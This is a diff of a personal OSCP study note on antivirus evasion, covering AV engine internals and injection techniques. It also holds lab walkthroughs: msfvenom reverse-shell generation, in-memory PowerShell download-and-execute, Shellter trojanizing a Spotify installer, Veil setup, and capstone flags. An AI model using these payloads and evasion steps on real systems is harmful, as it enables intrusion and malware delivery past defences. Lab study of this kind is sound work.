@@ -47,7 +47,7 @@ flowchart LR
     style E fill:#8b0000,color:#fff
 ```
 
-> 📸 Screenshot: the VirusTotal scan page for `malware.exe` — worth grabbing both the DETECTION tab (vendor count) and BEHAVIOR tab (what it actually does when run) for comparison
+> 📸 Screenshot: the VirusTotal scan page for `malware.exe`, worth grabbing both the DETECTION tab (vendor count) and BEHAVIOR tab (what it actually does when run) for comparison
 
 > 🔗 **YARA GitHub** (VirusTotal's repo, canonical language spec): [github.com/VirusTotal/yara](https://github.com/VirusTotal/yara)
 
@@ -59,19 +59,19 @@ flowchart LR
 
 A modern AV isn't one scanner. It's a pipeline of seven concurrent engines, each watching a different attack surface. They work simultaneously and rank detected events as benign, malicious, or unknown.
 
-1. **File Engine** — scheduled scans and real-time monitoring. Real-time detection uses Windows kernel-level mini-filter drivers to intercept file write operations *before* they complete. This is what catches a dropped payload the moment it touches disk.
+1. **File Engine**, scheduled scans and real-time monitoring. Real-time detection uses Windows kernel-level mini-filter drivers to intercept file write operations *before* they complete. This is what catches a dropped payload the moment it touches disk.
 
-2. **Memory Engine** — inspects process memory at runtime for known binary signatures or suspicious API call sequences. This is the main reason in-memory injection (15.2.2) is effective: if nothing written to disk is malicious, the file engine has nothing to catch.
+2. **Memory Engine**, inspects process memory at runtime for known binary signatures or suspicious API call sequences. This is the main reason in-memory injection (15.2.2) is effective: if nothing written to disk is malicious, the file engine has nothing to catch.
 
-3. **Network Engine** — monitors incoming/outgoing traffic at the local network interface. Primarily blocks known C2 communications, DNS-based beacons, and malicious downloads in transit.
+3. **Network Engine**, monitors incoming/outgoing traffic at the local network interface. Primarily blocks known C2 communications, DNS-based beacons, and malicious downloads in transit.
 
-4. **Disassembler** — translates machine code back into assembly, reconstructs code sections, and identifies encoding/decoding routines (the signature of a packed payload unpacking itself). This is how AV bypasses the first layer of a packer: it emulates the decode step, then scans the unpacked result.
+4. **Disassembler**, translates machine code back into assembly, reconstructs code sections, and identifies encoding/decoding routines (the signature of a packed payload unpacking itself). This is how AV bypasses the first layer of a packer: it emulates the decode step, then scans the unpacked result.
 
-5. **Emulator/Sandbox** — a safe isolated environment where a suspicious binary can actually run so the AV can watch what it does. Time-limited by necessity, which is why time-delayed execution is a known sandbox-evasion technique (sleep for 30+ seconds, then act).
+5. **Emulator/Sandbox**, a safe isolated environment where a suspicious binary can actually run so the AV can watch what it does. Time-limited by necessity, which is why time-delayed execution is a known sandbox-evasion technique (sleep for 30+ seconds, then act).
 
-6. **Browser Plugin** — extends AV visibility into content executing inside a browser (JavaScript, WebAssembly). Less relevant to this module's techniques but part of the full picture.
+6. **Browser Plugin**, extends AV visibility into content executing inside a browser (JavaScript, WebAssembly). Less relevant to this module's techniques but part of the full picture.
 
-7. **Machine Learning Engine** — the cloud tier. When the local AV isn't confident, it uploads metadata to the vendor's cloud model for a verdict. Requires internet access, which is why restricted-connectivity production servers often run with degraded AV capability.
+7. **Machine Learning Engine**, the cloud tier. When the local AV isn't confident, it uploads metadata to the vendor's cloud model for a verdict. Requires internet access, which is why restricted-connectivity production servers often run with degraded AV capability.
 
 ```mermaid
 flowchart TD
@@ -91,7 +91,7 @@ flowchart TD
     FE & ME & NE & DS & SB & BP & ML --> Verdict["Verdict: benign / malicious / unknown"]
 ```
 
-> 📸 Screenshot: the Avira or COMODO AV interface on the Windows 11 VM — worth grabbing before testing evasion against it, so you have a reference for what the product looks like in normal state
+> 📸 Screenshot: the Avira or COMODO AV interface on the Windows 11 VM, worth grabbing before testing evasion against it, so you have a reference for what the product looks like in normal state
 
 > 🔍 **Worth remembering generally:** the Emulator/Sandbox is time-limited. Malware that sleeps longer than the sandbox runs (typically a few seconds) can fool behaviour-based detection entirely. Advanced malware often starts with an environment check specifically because of this. Not directly relevant to this module's techniques, but explains why modern evasion tooling goes deeper than just changing bytes.
 
@@ -199,7 +199,7 @@ flowchart TD
 
 > 📸 Screenshot: if testing an obfuscator or crypter output, the before/after `sha256sum` comparison makes the "one byte change = new hash" lesson concrete
 
-> 🔗 **PayloadsAllTheThings** AV bypass section — packer/obfuscator/crypter examples and more (GitHub source, stable): [github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass)
+> 🔗 **PayloadsAllTheThings** AV bypass section, packer/obfuscator/crypter examples and more (GitHub source, stable): [github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass)
 
 **Lab status: ✅ Completed** (Q1 pure-recall):
 
@@ -215,12 +215,12 @@ flowchart TD
 
 In-memory techniques skip the file engine entirely. The trade-off: they're more complex to set up and they're now the primary target of memory engine and EDR telemetry monitoring.
 
-**Remote Process Memory Injection** — the classic, and the basis for this module's PowerShell bypass in 15.3.2. Inject a payload into another running process using four standard Windows API calls in sequence:
+**Remote Process Memory Injection**, the classic, and the basis for this module's PowerShell bypass in 15.3.2. Inject a payload into another running process using four standard Windows API calls in sequence:
 
-1. `OpenProcess()` — get a HANDLE to the target process (requires appropriate privileges)
-2. `VirtualAllocEx()` — allocate a writable+executable memory region inside the target process's address space
-3. `WriteProcessMemory()` — copy shellcode into that allocated region
-4. `CreateRemoteThread()` — create a new thread in the target process with its start address pointing at the injected shellcode
+1. `OpenProcess()`, get a HANDLE to the target process (requires appropriate privileges)
+2. `VirtualAllocEx()`, allocate a writable+executable memory region inside the target process's address space
+3. `WriteProcessMemory()`, copy shellcode into that allocated region
+4. `CreateRemoteThread()`, create a new thread in the target process with its start address pointing at the injected shellcode
 
 ```mermaid
 sequenceDiagram
@@ -236,9 +236,9 @@ sequenceDiagram
 
 > 🔁 **Similar to:** the fundamental goal (controlling where execution jumps) is identical to the return-address overwrite in [[Fixing Exploits#14.1.1. Buffer Overflow in a Nutshell|14.1.1's buffer overflow]]. Both techniques redirect the CPU to attacker-controlled code; the method is different (memory corruption vs legitimate API calls), the goal is the same.
 
-**Reflective DLL Injection** — loads a DLL from process memory rather than disk. The standard `LoadLibrary()` Windows API requires a file on disk. Attackers implement their own in-memory loader that handles the full DLL loading sequence (mapping sections, resolving imports, calling DllMain) without touching disk. More complex to implement but highly effective against file engines.
+**Reflective DLL Injection**, loads a DLL from process memory rather than disk. The standard `LoadLibrary()` Windows API requires a file on disk. Attackers implement their own in-memory loader that handles the full DLL loading sequence (mapping sections, resolving imports, calling DllMain) without touching disk. More complex to implement but highly effective against file engines.
 
-**Process Hollowing** — launch a legitimate process in a suspended state, hollow out its memory, replace it with malicious code, resume it. From the OS process list: `notepad.exe`. What's actually running: your payload.
+**Process Hollowing**, launch a legitimate process in a suspended state, hollow out its memory, replace it with malicious code, resume it. From the OS process list: `notepad.exe`. What's actually running: your payload.
 
 ```mermaid
 flowchart LR
@@ -250,7 +250,7 @@ flowchart LR
     style F fill:#8b0000,color:#fff
 ```
 
-**Inline Hooking** — installs a `jmp` instruction at the start of a target function in memory, redirecting execution to malicious code before the real function runs. Used in rootkits to intercept and hide system calls. Requires admin privileges to hook kernel functions. Notably, defensive tools (AV/EDR) use exactly the same technique, hooking `CreateRemoteThread`, `VirtualAllocEx`, etc. to inspect calls before they execute. Hooking is a sword that cuts both ways.
+**Inline Hooking**, installs a `jmp` instruction at the start of a target function in memory, redirecting execution to malicious code before the real function runs. Used in rootkits to intercept and hide system calls. Requires admin privileges to hook kernel functions. Notably, defensive tools (AV/EDR) use exactly the same technique, hooking `CreateRemoteThread`, `VirtualAllocEx`, etc. to inspect calls before they execute. Hooking is a sword that cuts both ways.
 
 > 🔍 **Worth remembering generally:** AV products often detect injection by hooking the same Windows APIs attackers use. When an AV flags an injection attempt, it's often not the shellcode itself being identified. It's the API call sequence matching a known injection pattern. Changing the API sequence (e.g., `NtCreateThread` instead of `CreateRemoteThread`) is a common evasion refinement, out of scope here but worth knowing exists.
 
@@ -285,7 +285,7 @@ How to disable automatic sample submission on Windows Defender:
 
 > 🔍 **Worth remembering generally:** any AV bypass has an expiry date. Vendor signature databases update continuously. A bypass that clears today may be detected by Friday. The more custom and unique the payload, the longer it tends to survive. Copied-from-GitHub shellcode has the shortest shelf life.
 
-> 🔗 **HackTricks** AV bypass overview (GitHub source, bypasses the paywall — verify the path matches current repo structure): [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks) — search for "av bypass" within the repo
+> 🔗 **HackTricks** AV bypass overview (GitHub source, bypasses the paywall, verify the path matches current repo structure): [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks), search for "av bypass" within the repo
 
 #### Tags: #TestingBestPractices #VirusTotal #Kleenscan #WindowsDefender #SampleSubmission #OPSEC #Module15
 
@@ -301,7 +301,7 @@ How to disable automatic sample submission on Windows Defender:
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f psh-reflection -o bypass.ps1
 ```
 
-> 🔗 **RevShells** — generates ready-to-use reverse shell one-liners in any language including correctly-encoded PowerShell variants, faster than hand-writing them: [revshells.com](https://revshells.com)
+> 🔗 **RevShells**, generates ready-to-use reverse shell one-liners in any language including correctly-encoded PowerShell variants, faster than hand-writing them: [revshells.com](https://revshells.com)
 
 The `-f psh-reflection` format produces a complete PowerShell script that:
 - Imports `VirtualAlloc` (kernel32.dll), `CreateThread` (kernel32.dll), and `memset` (msvcrt.dll) via P/Invoke reflection (P/Invoke, or Platform Invocation, is .NET's mechanism for calling native Windows API functions directly from managed code like PowerShell; "via reflection" means those function definitions are set up dynamically at runtime rather than being compiled in statically, which avoids the fixed import-table signatures AV tools typically look for)
@@ -312,7 +312,7 @@ The `-f psh-reflection` format produces a complete PowerShell script that:
 
 **The key detail:** every variable and function name is randomly generated each time. `xf`, `nfCl`, `uaQP` in the module's example. Different names on the next run. This is what breaks static string-signature detection. AV vendors can't blocklist `xf` because the next payload calls it something else entirely.
 
-> 📸 Screenshot: the raw msfvenom output showing the PowerShell script with random variable names — worth capturing to confirm they differ on a second generation
+> 📸 Screenshot: the raw msfvenom output showing the PowerShell script with random variable names, worth capturing to confirm they differ on a second generation
 
 #### Step 2: Transfer to target
 
@@ -352,15 +352,15 @@ sequenceDiagram
     Note over K: plain nc catches it, no Metasploit stager needed
 ```
 
-> 📸 Screenshot: the reverse shell landing on the nc listener — run `whoami` immediately inside the shell to confirm identity and capture both in one screenshot
+> 📸 Screenshot: the reverse shell landing on the nc listener, run `whoami` immediately inside the shell to confirm identity and capture both in one screenshot
 
 > 🔁 **Similar to:** the msfvenom shellcode generation here uses the same tool, the same LHOST/LPORT options, and similar bad-character/encoder awareness as [[Fixing Exploits#14.1.4. Fixing the Exploit|14.1.4's Sync Breeze payload]]. The difference is output format: `-f c` for a C byte array that time, `-f psh-reflection` for a full PowerShell script here. Same underlying shellcode generation, different delivery wrapper.
 
 > 🔍 **Worth remembering generally:** `psh-reflection` generates new random function and variable names every time you run `msfvenom`. If an AV engine starts flagging a specific script, regenerate rather than trying to manually rename things. The randomisation is built-in and more thorough than manual editing.
 
-> 🔗 **Video — PowerShell in-memory injection technique walkthrough:** search `"powershell injection msfvenom"` on [ippsec.rocks](https://ippsec.rocks) to find HTB boxes where this exact delivery chain appeared in a real exploitation context.
+> 🔗 **Video. PowerShell in-memory injection technique walkthrough:** search `"powershell injection msfvenom"` on [ippsec.rocks](https://ippsec.rocks) to find HTB boxes where this exact delivery chain appeared in a real exploitation context.
 
-> 🔍 **Worth remembering generally:** this payload is `windows/shell_reverse_tcp` (stageless) — a plain `nc` listener catches it directly. Using a staged payload like `windows/meterpreter/reverse_tcp` would require a Metasploit `multi/handler` running instead. The stageless choice is deliberate for the same reason as [[Fixing Exploits#Module Exercise VM .23: Unknown service, memory corruption|Module 14's VM #3]]: fewer moving parts, works with plain netcat.
+> 🔍 **Worth remembering generally:** this payload is `windows/shell_reverse_tcp` (stageless), a plain `nc` listener catches it directly. Using a staged payload like `windows/meterpreter/reverse_tcp` would require a Metasploit `multi/handler` running instead. The stageless choice is deliberate for the same reason as [[Fixing Exploits#Module Exercise VM .23: Unknown service, memory corruption|Module 14's VM #3]]: fewer moving parts, works with plain netcat.
 
 **Lab status: ✅ Completed** (Q1 pure-recall):
 
@@ -411,9 +411,9 @@ Confirm with `Y`.
 ```powershell
 Invoke-WebRequest -Uri http://192.168.45.219:8080/bypass.ps1 -OutFile C:\Users\offsec\Desktop\bypass.ps1
 ```
-HTTP server confirmed `200` response, but `dir C:\Users\offsec\Desktop\` came back empty — Avira's file engine quarantined the `.ps1` the moment it was written to disk.
+HTTP server confirmed `200` response, but `dir C:\Users\offsec\Desktop\` came back empty. Avira's file engine quarantined the `.ps1` the moment it was written to disk.
 
-> 📸 Screenshot: Avira quarantine notification — demonstrates exactly why in-memory execution exists: the file engine has nothing to scan if the payload never touches disk
+> 📸 Screenshot: Avira quarantine notification, demonstrates exactly why in-memory execution exists: the file engine has nothing to scan if the payload never touches disk
 
 > 🔍 **Worth remembering generally:** writing a payload to disk, even a well-obfuscated one, gives the file engine a chance to scan it. The psh-reflection format evades static signature detection well, but Avira still caught it here. The real evasion is never writing to disk at all.
 
@@ -492,9 +492,9 @@ flowchart TD
     style K fill:#2e7d32,color:#fff
 ```
 
-> 📸 Screenshot: Shellter's banner on launch (the ASCII art logo + "Wine Mode" text) — useful reference for confirming Wine is running Shellter correctly
-> 📸 Screenshot: Shellter's console output during the "Tracing..." / injection phase — confirms the PE structure was analysed and shellcode injected successfully
-> 📸 Screenshot: the "Injection: Verified!" confirmation at the end of the Shellter run — the key success indicator before transferring the modified PE
+> 📸 Screenshot: Shellter's banner on launch (the ASCII art logo + "Wine Mode" text), useful reference for confirming Wine is running Shellter correctly
+> 📸 Screenshot: Shellter's console output during the "Tracing..." / injection phase, confirms the PE structure was analysed and shellcode injected successfully
+> 📸 Screenshot: the "Injection: Verified!" confirmation at the end of the Shellter run, the key success indicator before transferring the modified PE
 
 **Setting up a Meterpreter listener** (if using staged `windows/meterpreter/reverse_tcp`):
 ```bash
@@ -513,8 +513,8 @@ client01\offsec
 > 🔍 **Worth remembering generally:** the Shellter scan result (clean on Avira's quick scan) reflects the IAT-reuse technique working against *static* file scanning. A behaviour-based or ML scan after actual execution may tell a different story. That's exactly why the labs test against a live running AV on a real VM rather than just checking a static file scan result.
 
 > 🔗 **Shellter official site** (free vs Pro comparison, download): [shellterproject.com](https://www.shellterproject.com/)
-> 🔗 **PayloadsAllTheThings** AV bypass — covers Shellter and alternative PE carriers: [github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass)
-> 🔗 **Video — Shellter PE injection walkthrough:** search `"shellter"` on [ippsec.rocks](https://ippsec.rocks) for HTB boxes where Shellter appeared. Also check the Shellter project's own demo video linked from [shellterproject.com](https://www.shellterproject.com/) — it shows the full interactive workflow including the IAT selection stage.
+> 🔗 **PayloadsAllTheThings** AV bypass, covers Shellter and alternative PE carriers: [github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass)
+> 🔗 **Video. Shellter PE injection walkthrough:** search `"shellter"` on [ippsec.rocks](https://ippsec.rocks) for HTB boxes where Shellter appeared. Also check the Shellter project's own demo video linked from [shellterproject.com](https://www.shellterproject.com/), it shows the full interactive workflow including the IAT selection stage.
 
 **Lab status: ✅ Completed** (Q1 pure-recall):
 
@@ -565,7 +565,7 @@ cp /home/kali/Downloads/b5954f199aed77c672af0b498b208ed5-spotifyfullwin10-32bit.
 shellter
 ```
 
-Interactive session — answer the prompts:
+Interactive session, answer the prompts:
 
 | Prompt | Answer | Why |
 |---|---|---|
@@ -579,7 +579,7 @@ Interactive session — answer the prompts:
 
 Shellter's output during injection:
 - Traced 4422 instructions through the PE (~1 min in Wine mode)
-- Selected IAT method 7: `CreateFileMapping/MapViewOfFile` — the only memory allocation pair available in this PE's import table that Stealth Mode allows
+- Selected IAT method 7: `CreateFileMapping/MapViewOfFile`, the only memory allocation pair available in this PE's import table that Stealth Mode allows
 - Generated ~305 bytes of polymorphic junk code as obfuscation (meaningless filler instructions inserted between the real payload bytes; "polymorphic" means the filler changes its byte pattern on every injection run, so AV can't fingerprint a fixed sequence)
 - Injected at virtual address `0x40e733` (file offset `0xdb33`) inside `.text`
 - Verified the injected code is reachable: `Injection: Verified!`
@@ -639,7 +639,7 @@ client01\offsec
 
 > 📸 Screenshot: msfconsole showing `[*] Sending stage` and `Command shell session 1 opened`, then the `whoami` output confirming `client01\offsec`
 
-**Lab answer:** shell obtained as `client01\offsec`. No OS{} flag file for this exercise — Q2 answer is **Stealth Mode** (the Shellter option that restores original PE execution flow).
+**Lab answer:** shell obtained as `client01\offsec`. No OS{} flag file for this exercise. Q2 answer is **Stealth Mode** (the Shellter option that restores original PE execution flow).
 
 > 🔍 **Worth remembering generally:** staged vs stageless payloads require matching listeners. Stageless (`windows/shell_reverse_tcp`, underscore): plain nc catches it. Staged (`windows/shell/reverse_tcp`, slash): requires `multi/handler` to serve the second stage. Mixing them causes the connection to open and immediately close with no useful error. The `[stager]` label in Shellter's payload menu is the giveaway.
 
@@ -651,7 +651,7 @@ client01\offsec
 
 ## 🏆 Capstone Labs
 
-> 🚩 **Hands-on, VM spin-up required.** Two Module Exercise VMs — separate from the learning-unit VM (#1 / Windows 11 / Avira) used in the 15.3 walkthroughs above. Both targets run **COMODO** antivirus, a harder target than Avira. Both use an FTP server that auto-executes uploaded `.exe`/`.bat` files from its root directory every few seconds — you don't need a user to manually click anything, just get the file there.
+> 🚩 **Hands-on, VM spin-up required.** Two Module Exercise VMs, separate from the learning-unit VM (#1 / Windows 11 / Avira) used in the 15.3 walkthroughs above. Both targets run **COMODO** antivirus, a harder target than Avira. Both use an FTP server that auto-executes uploaded `.exe`/`.bat` files from its root directory every few seconds, you don't need a user to manually click anything, just get the file there.
 
 ```mermaid
 sequenceDiagram
@@ -835,10 +835,10 @@ git clone https://github.com/Veil-Framework/Veil.git ~/Veil
 cd ~/Veil && sudo ./config/setup.sh --force --silent
 ```
 
-> 📸 Screenshot: Veil's main menu interface on first launch — confirms installation succeeded
+> 📸 Screenshot: Veil's main menu interface on first launch, confirms installation succeeded
 
 > 🔗 **Veil Framework GitHub** (official source, install instructions, payload list): [github.com/Veil-Framework/Veil](https://github.com/Veil-Framework/Veil)
-> 🔗 **Video — Veil framework walkthrough:** search `"veil framework"` on [ippsec.rocks](https://ippsec.rocks) for boxes where Veil appeared. TCM Security's "Practical Ethical Hacking" course also covers Veil in detail if you want a standalone tutorial rather than a box context.
+> 🔗 **Video. Veil framework walkthrough:** search `"veil framework"` on [ippsec.rocks](https://ippsec.rocks) for boxes where Veil appeared. TCM Security's "Practical Ethical Hacking" course also covers Veil in detail if you want a standalone tutorial rather than a box context.
 
 **Step 2: Generate the PowerShell payload**
 ```bash
@@ -976,13 +976,13 @@ flowchart TD
 
 **Further reading:**
 
-> 🔗 **Microsoft Security Blog** — "FinFisher exposed: A researcher's tale of defeating traps, tricks, and complex virtual machines" (search the Microsoft Security Blog directly — deep-links to that blog have historically moved, the article title is stable)
+> 🔗 **Microsoft Security Blog**. "FinFisher exposed: A researcher's tale of defeating traps, tricks, and complex virtual machines" (search the Microsoft Security Blog directly, deep-links to that blog have historically moved, the article title is stable)
 
-> 🔗 **Emeric Nasi**, "Bypass Antivirus Dynamic Analysis" — search on Google Scholar or ResearchGate for current hosting location; it's been hosted at various URLs over time
+> 🔗 **Emeric Nasi**, "Bypass Antivirus Dynamic Analysis", search on Google Scholar or ResearchGate for current hosting location; it's been hosted at various URLs over time
 
 > 🔗 **PayloadsAllTheThings** AV bypass index (stable GitHub): [github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass)
 
-> 🔗 **HackTricks** AV bypass techniques (GitHub source, bypasses paywall — search within the repo for "av bypass" to find the current path): [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks)
+> 🔗 **HackTricks** AV bypass techniques (GitHub source, bypasses paywall, search within the repo for "av bypass" to find the current path): [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks)
 
 #### Tags: #Module15Summary #AVEvasionRecap #AntivirusEvasion
 
@@ -1054,9 +1054,9 @@ ftp <target-ip>
 ```
 
 - **Command Appendix (AV Evasion sections):** [[Shells & Payloads#PowerShell In-Memory Injection (AV Bypass)|PowerShell In-Memory Injection]], [[Shells & Payloads#Shellter PE Injection|Shellter PE Injection]], [[Shells & Payloads#Staged Payload Handler (msfconsole multi/handler)|Staged Payload Handler]], [[Shells & Payloads#FTP Active-Mode Payload Delivery|FTP Active-Mode Delivery]]
-- **Command Breakdowns:** [[Antivirus Evasion (Breakdowns)]] — PowerShell AV flag semantics, staged vs stageless payload mechanics, wine32/Wine prefix requirements for Shellter
-- **Decision Tree:** [[Shells & Payloads (Decision Tree)]] — "AV blocking payload" node and "Shellter shows [stager]" node both added
-- **Methodology Cheat Sheet:** [[Windows Methodology#Step 2b: AV Evasion (When AV Is Blocking Direct Payloads)|Windows Methodology — Step 2b: AV Evasion]]
+- **Command Breakdowns:** [[Antivirus Evasion (Breakdowns)]]. PowerShell AV flag semantics, staged vs stageless payload mechanics, wine32/Wine prefix requirements for Shellter
+- **Decision Tree:** [[Shells & Payloads (Decision Tree)]]. "AV blocking payload" node and "Shellter shows [stager]" node both added
+- **Methodology Cheat Sheet:** [[Windows Methodology#Step 2b: AV Evasion (When AV Is Blocking Direct Payloads)|Windows Methodology. Step 2b: AV Evasion]]
 - **Modern Tooling:** no addition for this module. Shellter and Veil are themselves the automation tools for this area, and no faster standalone equivalent to the manual techniques taught exists that isn't a full C2 framework (excluded by Modern Tooling scope). See [[MODERN TOOLING]].
 
 #### Tags: #CommandReference #Module15
@@ -1073,19 +1073,19 @@ That said, there are two distinct skills here worth separating: the **AV bypass 
 
 **Payload delivery + Windows execution workflow:**
 
-**[HTB Devel](https://app.hackthebox.com/machines/Devel)** (Windows, Easy) — IIS file upload to remote code execution. Transfer an ASPX webshell, trigger it via the browser, upgrade to a shell. The exact same file-transfer-then-execute pattern as this module's capstone FTP delivery labs, just over HTTP instead of FTP. Do this before the capstones if the delivery mechanics feel uncertain.
+**[HTB Devel](https://app.hackthebox.com/machines/Devel)** (Windows, Easy). IIS file upload to remote code execution. Transfer an ASPX webshell, trigger it via the browser, upgrade to a shell. The exact same file-transfer-then-execute pattern as this module's capstone FTP delivery labs, just over HTTP instead of FTP. Do this before the capstones if the delivery mechanics feel uncertain.
 
-**[HTB Granny](https://app.hackthebox.com/machines/Granny)** (Windows, Easy) — WebDAV file upload with extension restrictions that need bypassing. Pairs with Devel. Same delivery workflow, adds the wrinkle of working around upload filters.
+**[HTB Granny](https://app.hackthebox.com/machines/Granny)** (Windows, Easy). WebDAV file upload with extension restrictions that need bypassing. Pairs with Devel. Same delivery workflow, adds the wrinkle of working around upload filters.
 
-**[HTB Optimum](https://app.hackthebox.com/machines/Optimum)** (Windows, Easy) — HFS (HTTP File Server) exploitation, PowerShell delivery of the shell. The PS payload generation + nc listener catch from this module appears here in a real box context. Good for making `msfvenom` + PowerShell delivery feel routine.
+**[HTB Optimum](https://app.hackthebox.com/machines/Optimum)** (Windows, Easy). HFS (HTTP File Server) exploitation, PowerShell delivery of the shell. The PS payload generation + nc listener catch from this module appears here in a real box context. Good for making `msfvenom` + PowerShell delivery feel routine.
 
 ---
 
 **Genuine AV evasion practice (OffSec labs only):**
 
-**[PG Practice: Hutch](https://www.offensive-security.com/labs/)** — Windows AD box in the OSCP prep list. Involves delivering a payload past endpoint restrictions. Commonly flagged by the community as requiring AV bypass techniques (AppLocker restrictions, endpoint protection). Check recent OSCP community write-ups on whether COMODO or Defender is the target — this changes which bypass technique applies.
+**[PG Practice: Hutch](https://www.offensive-security.com/labs/)**. Windows AD box in the OSCP prep list. Involves delivering a payload past endpoint restrictions. Commonly flagged by the community as requiring AV bypass techniques (AppLocker restrictions, endpoint protection). Check recent OSCP community write-ups on whether COMODO or Defender is the target, this changes which bypass technique applies.
 
-**[PG Practice: Nickel](https://www.offensive-security.com/labs/)** — Windows box on the OSCP prep list. Involves a non-standard service and payload delivery. Community flagged as requiring care around payload execution in a monitored environment. Worth attempting after completing this module's capstones.
+**[PG Practice: Nickel](https://www.offensive-security.com/labs/)**. Windows box on the OSCP prep list. Involves a non-standard service and payload delivery. Community flagged as requiring care around payload execution in a monitored environment. Worth attempting after completing this module's capstones.
 
 > 🔧 **Verify before attempting:** PG Practice VMs update. Both Hutch and Nickel are correct as of the time this was written, but the specific AV configuration may have changed. Check a recent community walkthrough on the OSCP Discord or the OffSec forums before spinning them up.
 
@@ -1093,9 +1093,9 @@ That said, there are two distinct skills here worth separating: the **AV bypass 
 
 **How to find more:**
 
-> 🔗 **ippsec.rocks** — search `"antivirus"` or `"shellter"` or `"msfvenom evasion"` to pull up HTB walkthroughs where the technique surfaced: [ippsec.rocks](https://ippsec.rocks)
+> 🔗 **ippsec.rocks**, search `"antivirus"` or `"shellter"` or `"msfvenom evasion"` to pull up HTB walkthroughs where the technique surfaced: [ippsec.rocks](https://ippsec.rocks)
 
-> 🔗 **OffSec PG Practice box list** — filter by OS: Windows, then sort by community difficulty. Any box tagged "AV" or "evasion" in the community notes is worth prioritising for this module: [portal.offsec.com](https://portal.offsec.com)
+> 🔗 **OffSec PG Practice box list**, filter by OS: Windows, then sort by community difficulty. Any box tagged "AV" or "evasion" in the community notes is worth prioritising for this module: [portal.offsec.com](https://portal.offsec.com)
 
 #### Tags: #RelatedBoxes #Module15 #HTBDevel #HTBGranny
 
@@ -1109,8 +1109,8 @@ That said, there are two distinct skills here worth separating: the **AV bypass 
 - [x] **15.2.1 On-disk Evasion:** done (Q1 answered, packer/obfuscator/crypter taxonomy with diagram)
 - [x] **15.2.2 In-memory Evasion:** done (Q1 & Q2 answered, all 4 techniques with diagrams)
 - [x] **15.3.1 Testing for AV Evasion:** done (best practices, VirusTotal/Kleenscan, test VM setup)
-- [x] **15.3.2 Evading AV with Thread Injection:** done (theory, VirtualAlloc Q1 answered, hands-on complete) — key finding: must use `IEX(New-Object Net.WebClient).DownloadString(...)` not `Invoke-WebRequest -OutFile`, Avira's file engine catches the disk write; `client01\offsec`
-- [x] **15.3.3 Automating AV Evasion with Shellter:** done (theory, Stealth Mode Q1 & Q2 answered, Shellter+Spotify hands-on complete — `client01\offsec` via staged shell, Avira bypassed), Capstone 1 complete — `NT AUTHORITY\SYSTEM`, flag `OS{897020a6b5826057c340bd25e616f091}`, COMODO bypassed ✅, Capstone 2 complete — `NT AUTHORITY\SYSTEM`, flag `OS{44c3961aad7bb6f399a5e43cdc21cfb4}`, COMODO v12.2.2.8012 bypassed ✅
+- [x] **15.3.2 Evading AV with Thread Injection:** done (theory, VirtualAlloc Q1 answered, hands-on complete), key finding: must use `IEX(New-Object Net.WebClient).DownloadString(...)` not `Invoke-WebRequest -OutFile`, Avira's file engine catches the disk write; `client01\offsec`
+- [x] **15.3.3 Automating AV Evasion with Shellter:** done (theory, Stealth Mode Q1 & Q2 answered, Shellter+Spotify hands-on complete, `client01\offsec` via staged shell, Avira bypassed), Capstone 1 complete, `NT AUTHORITY\SYSTEM`, flag `OS{897020a6b5826057c340bd25e616f091}`, COMODO bypassed ✅, Capstone 2 complete, `NT AUTHORITY\SYSTEM`, flag `OS{44c3961aad7bb6f399a5e43cdc21cfb4}`, COMODO v12.2.2.8012 bypassed ✅
 - [x] **15.4 Wrapping Up:** done (summary diagram added, external resources linked)
 
 **Module 15 is fully complete. Solo enrichment pass done (2026-08-09). Joint hub-doc sync done (2026-08-10): [[Windows Methodology]] (Step 2b AV Evasion), [[Shells & Payloads (Decision Tree)]] (AV and stager nodes), [[Shells & Payloads]] (Command Appendix, four new sections), [[Antivirus Evasion (Breakdowns)]] (new file, three entries), [[MODERN TOOLING]] (Module 15 added to no-addition list). Nothing open.**
